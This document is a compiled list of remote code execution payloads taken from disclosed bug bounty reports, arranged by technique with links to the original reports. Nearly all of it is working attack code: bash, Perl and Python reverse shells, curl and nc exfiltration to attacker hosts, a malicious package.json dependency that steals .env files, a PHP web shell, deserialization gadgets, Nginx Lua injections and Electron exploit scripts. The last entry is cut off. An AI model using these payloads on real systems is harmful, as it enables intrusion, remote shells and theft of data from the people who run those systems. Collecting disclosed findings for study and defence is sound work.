# Remote Code Execution

72 payloads from disclosed reports.

## Buffer overflow via oversized PROXY protocol v1 header

### `c6ff84cc`

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `915acb04`

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x32\x08\x6f\x6faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `ddfaa60b`

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)


## OS command injection using pipe and IFS to run `ps aux` and exfiltrate via curl

### `53257c57`

```
0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-
```

**Parameter:** `y`
— [RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`](https://hackerone.com/reports/212696) · Imgur · [neex](https://hackerone.com/neex)

### `ab752a52`

```
http://<your-account>.target.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303
```

**Parameter:** `y`
— [RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`](https://hackerone.com/reports/212696) · Imgur · [neex](https://hackerone.com/neex)

### `ac46fdeb`

```
ps aux|curl http://<your-server> -d @-
```

**Parameter:** `y`
— [RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`](https://hackerone.com/reports/212696) · Imgur · [neex](https://hackerone.com/neex)


## Command injection via semicolon‑chained commands in npm module name passed to pm2 install

### `81d0a78d`

```
bl4de:~/playground/Node $ ./pm2 install "test;pwd;whoami;uname;"
[PM2][Module] Installing NPM test;pwd;whoami;uname; module
[PM2][Module] Calling [NPM] to install test;pwd;whoami;uname; ...
npm WARN saveError ENOENT: no such file or directory, open '/Users/user/package.json'
npm WARN enoent ENOENT: no such file or directory, open '/Users/user/package.json'
npm WARN bl4de No description
npm WARN bl4de No repository field.
npm WARN bl4de No README data
npm WARN bl4de No license field.

+ test@0.
```

**Parameter:** `module_name`
— [Command Injection in npm module name passed as an argument to pm2.install() function](https://hackerone.com/reports/633364) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `3c67299d`

```
pm2 install "test;pwd;whoami;uname;"
```

**Parameter:** `module_name`
— [Command Injection in npm module name passed as an argument to pm2.install() function](https://hackerone.com/reports/633364) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## EJS server‑side template injection executing a command via child_process.execSync

### `5bb0aec3`

```
<%= require("child_process").execSync("curl http://attacker:8080/`id`") %>
```

**Parameter:** `content`
— [Remote Code Execution via unsafe usage of `reply.view({ raw })` in @fastify/view (EJS template engine)](https://hackerone.com/reports/3122019) · Fastify · [oblivionsage](https://hackerone.com/oblivionsage)

### `f74b0673`

```
<%= require("child_process").execSync("bash -i >& /dev/tcp/attacker.com/4444 0>&1") %>
```

**Parameter:** `content`
— [Remote Code Execution via unsafe usage of `reply.view({ raw })` in @fastify/view (EJS template engine)](https://hackerone.com/reports/3122019) · Fastify · [oblivionsage](https://hackerone.com/oblivionsage)


## Node.js code injection via URL query parameter 'q' that breaks out of a comment and executes child_process.exec

### `b936b46d`

```
page.waitForNavigation(/*{ url: 'https://example.com?q=*/require(`child_process`).exec(`touch$IFS/tmp/dee-see`)/*' }*/),
```

**Parameter:** `q`
— [Synthetics Recorder: Code injection when recording website with malicious content](https://hackerone.com/reports/1636382) · Elastic · [dee-see](https://hackerone.com/dee-see)

### `3dcef316`

```
step('Go to http://target.com:4567/', async () => {
      await page.goto('http://target.com:4567/');
      await Promise.all([
        page.waitForNavigation(/*{ url: 'https://evil.com/dee-see?query=*/require(`child_process`).exec(`touch$IFS/tmp/dee-see`)/*' }*/),
        page.click('[aria-label="GitLab"] svg')
      ]);
    });
```

**Parameter:** `query`
— [Synthetics Recorder: Code injection when recording website with malicious content](https://hackerone.com/reports/1636382) · Elastic · [dee-see](https://hackerone.com/dee-see)


## Obfuscated JavaScript execution using eval(String.fromCharCode) in img onerror attribute (DOM XSS)

### `63dfd8b1`

```
eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100
```

**Parameter:** `note_body`
— [\[Simplenote for Windows\] Client RCE via External JavaScript Inclusion leveraging Electron](https://hackerone.com/reports/291539) · Automattic · [ysx](https://hackerone.com/ysx)

### `563e20f0`

```
## Test Note
### HackerOne Windows RCE PoC - pops "netplwiz"

<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99
```

**Parameter:** `note_body`
— [\[Simplenote for Windows\] Client RCE via External JavaScript Inclusion leveraging Electron](https://hackerone.com/reports/291539) · Automattic · [ysx](https://hackerone.com/ysx)


## OS command injection (command injection) using semicolon‑separated commands

### `aeda56bd`

```
package ; whoami
```

— [POOL_UPGRADE request handler may allow an unauthenticated attacker to remotely execute code on every node in the network. ](https://hackerone.com/reports/1705717) · Linux Foundation Decentralized Trust · [shakedreiner](https://hackerone.com/shakedreiner) · $2,000.0

### `e48895eb`

```
ls;sleep 5
```

— [Several simple remote code execution in pdf-image](https://hackerone.com/reports/781664) · Node.js third-party modules · [gabriel-kimiaie](https://hackerone.com/gabriel-kimiaie)


## PROXY protocol v2 header with LOCAL command causing out‑of‑bounds read

### `8d4e32aa`

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x20\x11\x00\x00" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `eeb5e02e`

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x00\x00\x00" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)


## Remote code execution via Redis LPUSH deserialization gadget (class_eval) executing shell commands

### `79f0d373`

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \').read\"],"queue\":\"system_hook_push\"}"
```

— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `7fb9bced`

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Arbitrary command execution (whoami piped to curl) triggered by the prototype‑pollution RCE payload

### `4063eda0`

```
whoami | curl https://target.com/ -d@-
```

— [Remote Code Execution on Cloud via latest Kibana 7.6.2](https://hackerone.com/reports/852613) · Elastic · [alexbrasetvik](https://hackerone.com/alexbrasetvik) · $10,000.0


## Argument injection using tab character to split into extra curl option

### `fe0bb765`

```
tab_payload=$(printf 'file://%s\t--url=file://%s' "$BENIGN" "$SECRET")
wcurl -- "$tab_payload"
```

— [wcurl treats some URL operands after -- as curl options](https://hackerone.com/reports/3708482) · curl · [p4p3r_hak](https://hackerone.com/p4p3r_hak)


## Bash reverse shell that connects back to the attacker via /dev/tcp

### `be540e19`

```
bash -i >& /dev/tcp/<c2-ip-here>/8888 0>&1 &
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)


## buffer overflow via excessively long Host header

### `6e450440`

```
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc 
```

**Parameter:** `Host`
— [Squid as reverse proxy RCE and data leak](https://hackerone.com/reports/778610) · Internet Bug Bounty · [guido](https://hackerone.com/guido)


## Command injection via backticks in MVG image delegate URL

### `0af56550`

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```

— [RCE in profile picture upload](https://hackerone.com/reports/135072) · HackerOne · [c666a323be94d57](https://hackerone.com/c666a323be94d57)


## Command injection via backticks in redirect URL (shell injection)

### `f58f68f8`

```
echo -en "HTTP/1.1 302 Found\r\nLocation: https://192.168.1.100/login.cgi `reboot`\r\nContent-Length: 0\r\n\r\n" | ncat -lp 8080
```

— [Read-Only user can execute arbitraty shell commands on AirOS](https://hackerone.com/reports/139398) · Ubiquiti Inc. · [rbran](https://hackerone.com/rbran)


## Command injection using Bash brace expansion in a filename argument

### `4c072064`

```
$({touch,a})
```

— [\[pdfinfojs\] Command Injection on filename parameter](https://hackerone.com/reports/330957) · Node.js third-party modules · [caioluders](https://hackerone.com/caioluders)


## Command injection via $(…) in a /calc command to list parent directory contents

### `0250245a`

```
/calc test $(ls ../)
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)


## Command injection by chaining commands with && in input to a Node module that executes via /bin/sh

### `3bdb9cc7`

```
$ node
> const processes = require('listening-processes')
> processes(`'Python && whoami >> hh;'`)
/bin/sh: \s.*:[0-9]* (LISTEN): command not found
{ Python:
   [ { command: 'Python',
       pid: '14720',
       port: '8000',
       invokingCommand:
        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }
```

— [\[listening-processes\] Command Injection](https://hackerone.com/reports/511459) · Node.js third-party modules · [notpwnguy](https://hackerone.com/notpwnguy)


## Command injection using a pipe to execute curl for data exfiltration

### `36f97050`

```
nameOfFile=sample.rar"|curl target.com:443/data?id=$(id | base64)|"&directory=&external=0
```

**Parameter:** `nameOfFile`
— [Remote Code Execution via Extract App Plugin](https://hackerone.com/reports/546753) · Nextcloud · [hdbreaker](https://hackerone.com/hdbreaker)


## Command injection (RCE) via malicious value in the JSON "foo" field

### `39aaf3be`

```
{"foo":"\";bash -i >& /dev/tcp/192.168.3.7/6666 0>&1;\""}
```

**Parameter:** `foo`
— [CVE-2022-24288: Apache Airflow: TWO RCEs in example DAGs](https://hackerone.com/reports/1492896) · Internet Bug Bounty · [x_h1](https://hackerone.com/x_h1)


## Command injection (shell injection) through an unsanitized PR title

### `4d8888a7`

```
U";cat $GITHUB_WORKSPACE/.git/config | xxd -p | base64; echo "D
```

**Parameter:** `title`
— [Code exec on Github runner via Pull request name](https://hackerone.com/reports/2471956) · Linux Foundation Decentralized Trust · [another_dude](https://hackerone.com/another_dude)


## Command injection using shell operators (||) in input

### `35c5d507`

```
npm i commit-msg -g # Install affected module
git init # Init the current dir as *git*
echo "test||reboot" | commit-msg stdin # Your machine will be rebooted because `reboot` command is injected
node poc.js #  Run the PoC
```

— [\[commit-msg\] RCE via insecure command formatting](https://hackerone.com/reports/885031) · Node.js third-party modules · [mik317](https://hackerone.com/mik317)


## Command injection via shell subcommand syntax $(…) in a /wiki chat command to execute arbitrary commands

### `a3350db8`

```
/wiki test $(id)
    /wiki test $(pwd)
    /wiki test $(ls -al .)
    /calc test $(cat /etc/passwd)
    /calc test $(ls -al ../)
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)


## Command injection by supplying a Pathname string that starts with a pipe character, causing the shell to execute the following command

### `3aef1553`

```
$ ruby -v
ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-darwin16]

$ irb
irb(main):001:0> `ls`
=> ""

irb(main):002:0> require 'pathname'
=> true
irb(main):003:0> Pathname("|touch binread").binread
=> ""
irb(main):004:0> Pathname("|touch binwrite").binwrite("")
=> 0
irb(main):005:0> Pathname("|touch each_line").each_line {|v| p v}
=> nil
irb(main):006:0> Pathname("|touch read").read
=> ""
irb(main):007:0> Pathname("|touch readlines").readlines
=> []
irb(main):008:0> Pathname("|touch write")
```

— [Command injection in Pathname](https://hackerone.com/reports/449482) · Ruby · [ooooooo_q](https://hackerone.com/ooooooo_q) · $200.0


## Command injection via system() call hijacked through mruby_engine allocf

### `edb0ed81`

```
system("id>/tmp/pwned")
```

— [mruby-engine: UAF in MRubyEngine#initialize enables local RCE](https://hackerone.com/reports/3679660) · Shopify · [0xd0ff9](https://hackerone.com/0xd0ff9)


## Command injection through a malicious version string in package.json ("lodash": "4.17.21' && curl ... && echo '")

### `4b7646c5`

```
{
  "name": "@company/analytics-helper",
  "version": "2.1.0",
  "dependencies": {
    "lodash": "4.17.21' && curl https://attacker.com/exfil?d=$(cat /asset-input/.env|base64) && echo '"
  }
}
```

— [OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)](https://hackerone.com/reports/3637898) · AWS VDP · [kaporia](https://hackerone.com/kaporia)


## Command injection through unsanitized connectString option leading to arbitrary command execution

### `1c757c09`

```
var publisher = require('apex-publish-static-files');
 
publisher.publish({
connectString: ";cat /etc/passwd ;",
    directory: "public",
    appID: 111
});
```

**Parameter:** `connectString`
— [\[apex-publish-static-files\] Command Injection on connectString](https://hackerone.com/reports/405694) · Node.js third-party modules · [abdilahrf_](https://hackerone.com/abdilahrf_)


## Command injection via unsanitized cookie leading to child_process.exec execution

### `628f3fde`

```
document.cookie = "test='/require('child_process').exec('calc.exe')//"
```

**Parameter:** `cookie`
— [RCE in 'Copy as Node Request' BApp via code injection](https://hackerone.com/reports/1167530) · PortSwigger Web Security · [ryotak](https://hackerone.com/ryotak)


## Command injection via unsanitized string in PDFImage constructor

### `c981b292`

```
var pdfImage = new PDFImage('"; sleep 500 #"');
```

— [Several simple remote code execution in pdf-image](https://hackerone.com/reports/781664) · Node.js third-party modules · [gabriel-kimiaie](https://hackerone.com/gabriel-kimiaie)


## Command injection via unsanitized URL passed to exec (shell injection)

### `77746dc5`

```
require("open")("http://example.com/`touch /tmp/tada`");
```

**Parameter:** `url`
— [\[open\] concatenation of unsanitized input into exec() command](https://hackerone.com/reports/319473) · Node.js third-party modules · [chalker](https://hackerone.com/chalker)


## Command injection via $(…) in a /wiki command to run arbitrary commands

### `a55dc56a`

```
/wiki test $(mycommand)
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)


## DOM‑based XSS via prototype pollution (overriding Function.prototype.call)

### `ed65ead3`

```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://target.com/ncr"},"openInForeground":true}'
    }
    return this.apply(e);
}
alert();

setTimeout(function(){
	for(var windowKey=0;windowKey<10000;windowKey++){
		Function.prototype.call=function(e){
			if(e && e[0] && e[0]=="window-alert"){
				e[0]="dispatch-action";
				e[1]=`{"actionType":"window-
```

— [Brave Browser unexpectedly allows to send arbitrary IPC messages](https://hackerone.com/reports/187542) · Brave Software · [masatokinugawa](https://hackerone.com/masatokinugawa) · $300.0


## DOM‑based XSS that triggers a file:// URL to launch Calculator

### `e6a23000`

```
(function() {
    const payload = `file:///System/Applications/Calculator.app`;
    var counter = 0;
    var target = document.createElement(`a`);
    target.setAttribute(`href`, payload);
    document.body.appendChild(target);
    var old_test = RegExp.prototype.test;
    RegExp.prototype.test = function (s) {
        if (s === payload) {
            return (++counter > 3);
        }
        return old_test.call(this, s);
    };
    target.dispatchEvent(new Event(`click`));
})();
```

— [XSS leads to RCE on the RocketChat desktop client.](https://hackerone.com/reports/899964) · Rocket.Chat · [fabianfreyer](https://hackerone.com/fabianfreyer)


## Electron RCE by obtaining BrowserWindow and executing child_process.exec

### `99c307c4`

```
<html>
<body>
<script>
  // overwrite functions to get a BrowserWindow object:
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank') // leak BrowserWindow class
  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
  nbw.loadURL('about:blank') // need to load some URL for interaction
  nbw.
```

— [Remote Code Execution in Slack desktop apps + bonus](https://hackerone.com/reports/783877) · Slack · [oskarsv](https://hackerone.com/oskarsv)


## HTML attribute injection in markdown link (onmouseover JavaScript)

### `98abfe3a`

```
[ hax ](http://hax//onmouseover=location='https://target.com/hax/rocket/hack.html';"`hax`zzz)
```

— [Remote Code Execution in Rocket.Chat Desktop](https://hackerone.com/reports/276031) · Rocket.Chat · [mattaustin](https://hackerone.com/mattaustin)


## ImageTragick PostScript payload delivering a reverse shell

### `f69f2886`

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

— [H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products](https://hackerone.com/reports/422944) · Shopify · [fransrosen](https://hackerone.com/fransrosen)


## Local file inclusion via directory traversal in account_name parameter

### `661e9843`

```
The retrieve the content from file `                                 `
```

**Parameter:** `account_name`
— [CVE-2021-40870 on \[52.204.160.31\]](https://hackerone.com/reports/1356845) · Elastic · [fdeleite](https://hackerone.com/fdeleite)


## Lua code injection using loadstring to execute arbitrary shell commands

### `e327613f`

```
<lua>
_,execute = pcall(loadstring,
    [[
        local command = ...;
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result;
    ]]
);

print(execute('id'));
execute('echo vakzz > /tmp/ggg');
</lua>
```

— [RCE via WikiCloth markdown rendering if the `rubyluabridge` gem is installed](https://hackerone.com/reports/1401444) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,000.0


## MQTT CONNECT packet with oversized password length (0xFFFF) causing a heap overflow

### `8e86c506`

```
# Craft CONNECT packet with password length = 65535 (0xFFFF)
printf '\x10\x1a\x00\x04MQTT\x04\xc2\x00\x3c\x00\x04test\x00\x04user\xff\xff' | nc localhost 1883
```

— [Buffer Overflow in curl MQTT Test Server (tests/server/mqttd.c) via Malicious CONNECT Packet](https://hackerone.com/reports/3101127) · curl · [drdee-hackerone](https://hackerone.com/drdee-hackerone)


## Nginx Lua code injection executing commands via io.popen using a request header

### `9c181d7b`

```
set_by_lua_block $my_var { 
            local rsfile = io.popen(ngx.req.get_headers()["pathinjection"]);
            local rschar = rsfile:read("*all");ngx.say(rschar); 
            return rschar;
} 
proxy_set_header X-My-Var $my_var;
```

— [Injection in path parameter of Ingress-nginx](https://hackerone.com/reports/2701701) · Kubernetes · [fisjkars](https://hackerone.com/fisjkars)


## PHP reverse shell (socket connection) written to a file via exploit

### `0b72e91f`

```
use Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}
```

— [Remote Code Execution via Extract App Plugin](https://hackerone.com/reports/546753) · Nextcloud · [hdbreaker](https://hackerone.com/hdbreaker)


## PHP web shell backdoor using system($_GET['exec'])

### `3706fe73`

```
<?php system($_GET['exec']); ?> // fedef@secsignal.org
```

— [Remote Code Execution through Deserialization Attack in OwnBackup app.](https://hackerone.com/reports/562335) · ownCloud · [q3rv0](https://hackerone.com/q3rv0)


## RCE via `extra-ffmpeg` by passing a back‑ticked command (`touch HACKED`) as an input file argument

### `558ff062`

```
const ffmpeg = require('extra-ffmpeg');
ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);
```

— [\[extra-ffmpeg\] Command Injection via insecure command formatting](https://hackerone.com/reports/863944) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)


## RCE by invoking `ps.kill` with a back‑ticked command, leading to command execution in the underlying shell

### `4b3883eb`

```
const ps = require('xps');
ps.kill('`touch HACKED;`').fork();
```

— [\[xps\] Command Injection via insecure command concatenation](https://hackerone.com/reports/865168) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)


## Remote code execution via command injection in task definition environment variables

### `4e9a3eeb`

```
retries: 0
created: '2023-10-23T08:10:11.044Z'
deadline: '2023-10-23T11:10:11.044Z'
expires: '2024-10-23T11:10:11.044Z'
taskQueueId: proj-misc/tutorial
projectId: none
tags: {}
scopes: []
payload:
  env:
# Commands to run in here
    test2 --help ; whoami ; ls -lah ;: '--help'
  image: ubuntu:latest
  command:
    - /bin/bash
    - '-c'
    - 'echo hello'
  maxRunTime: 5000
extra: {}
metadata:
  name: example-task
  description: An **example** task
  owner: name@example.com
  source: https://com
```

**Parameter:** `payload.env`
— [RCE on worker host due to unsanitized "env" variable name in task definition on target.com](https://hackerone.com/reports/2221404) · Mozilla · [ebrietas](https://hackerone.com/ebrietas) · $500.0


## Remote code execution via malicious Nginx Ingress configuration snippet that executes commands from the 'cmd' HTTP header using Lua.

### `221ddd04`

```
cat > su.yml<<EOF
apiVersion: target.com/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    evil.com/ingress.class: "nginx"
    evil2.com/configuration-snippet: |
      more_set_headers "suanve"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = 
```

— [Ingress nginx annotation injection causes arbitrary command execution](https://hackerone.com/reports/1728174) · Kubernetes · [suanve](https://hackerone.com/suanve) · $2,500.0


## Remote code execution via Nginx Lua injection in a custom request header

### `20c5dd08`

```
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

— [RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field](https://hackerone.com/reports/1620702) · Kubernetes · [ginoah](https://hackerone.com/ginoah) · $2,500.0


## Remote code execution by passing malicious code to the 'v' parameter evaluated via eval

### `1a2933da`

```
https://example.com/controller?t=eval&v=system("touch /tmp/hacked")
```

**Parameter:** `v`
— [Argument/Code Injection via ActiveStorage's image transformation functionality](https://hackerone.com/reports/1154034) · Ruby on Rails · [gquadros_](https://hackerone.com/gquadros_)


## Remote code execution via Ruby backticks executing a shell command

### `561ce09c`

```
puts "hello from ruby"
`echo vakzz was here > /tmp/vakzz`
```

— [RCE via unsafe inline Kramdown options when rendering certain Wiki pages](https://hackerone.com/reports/1125425) · GitLab · [vakzz](https://hackerone.com/vakzz) · $20,000.0


## Remote code execution via system() call

### `859a2306`

```
system('id')
```

— [RCE on Wordpress website](https://hackerone.com/reports/2248328) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)


## Remote code execution through malicious PostScript embedded in an uploaded image

### `0c4fdbd5`

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

— [Remote Code Execution on target.com/my_reports on Logo upload](https://hackerone.com/reports/403417) · Semrush · [fransrosen](https://hackerone.com/fransrosen)


## Remote code execution by uploading a malicious .gem file to RubyGems API

### `15c1fdad`

```
cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' https://target.com/api/v1/gems
```

— [Remote code execution on target.com](https://hackerone.com/reports/274990) · RubyGems · [max](https://hackerone.com/max) · $1,500.0


## Reverse shell via bash script executed through command injection

### `d2baf1d9`

```
#!/bin/bash
bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
DEVICE=$1
CIDER=$2
IP=$3
/sbin/ifconfig $1 $2 $3

4. Make the script executable by running `chmod +x /tmp/ifconfig`

5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.

6. On the host in step 1, a reverse Bash shell connects. Run the command "whoami" (or id) and "hostname" and verify th
```

— [Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation](https://hackerone.com/reports/784714) · Slack · [jhancock](https://hackerone.com/jhancock) · $750.0


## Ruby Marshal deserialization leading to command execution via Kernel.system

### `33c23636`

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r
```

— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Server-side request forgery via crafted github_hostname parameter in import API

### `8d1182b2`

```
curl "http://target.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://evil.com:80"
}'
```

**Parameter:** `github_hostname`
— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Shell command injection via unsanitized positional argument to `node --run`, enabling arbitrary command execution

### `031373bf`

```
SAFE_ARG'; whoami > "$NODE_RUN_COMMAND_OUTPUT"; #
```

— [Node --run POSIX positional argument escaping allows shell command injection](https://hackerone.com/reports/3817602) · Node.js · [yottt](https://hackerone.com/yottt)


## Shell injection via unsanitized externalModules in CDK bundling, allowing command execution

### `62abe80b`

```
// Published as "convenient-lambda" on npm
